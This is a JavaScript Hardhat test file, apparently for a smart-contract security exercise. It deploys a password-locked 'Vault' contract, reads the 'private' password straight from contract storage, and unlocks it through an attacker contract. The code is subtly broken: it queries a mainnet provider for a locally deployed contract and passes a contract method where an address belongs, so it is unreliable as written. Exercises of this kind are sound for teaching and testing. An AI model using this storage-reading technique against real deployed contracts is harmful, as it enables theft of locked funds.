const { expect } = require("chai");
const { ethers } = require("hardhat");

const fs = require("fs");
const INFURA_KEY = fs.readFileSync(".infura").toString().trim();

describe("Vault Attack", async function () {
  it("should be unlocked", async function () {
    // Deploy the vault smart contract
    const Vault = await ethers.getContractFactory("Vault");
    const vault = await Vault.deploy(
      "0x412076657279207374726f6e67207365637265742070617373776f7264203a29"
    );

    // Initially it should be locked
    const initialLock = await vault.locked();
    expect(initialLock).to.be.equal(true);

    // Deploy the vaultAttacker smart contract
    const url = "https://mainnet.infura.io/v3/" + INFURA_KEY;
    const provider = new ethers.providers.JsonRpcProvider(url);
    const password = await provider.getStorageAt(vault.password, 1);
    const VaultAttacker = await ethers.getContractFactory("VaultAttacker");
    await VaultAttacker.deploy(vault.address, password);

    // Finally it should be unlocked
    const finalLock = await vault.locked();
    expect(finalLock).to.be.equal(false);
  });
});
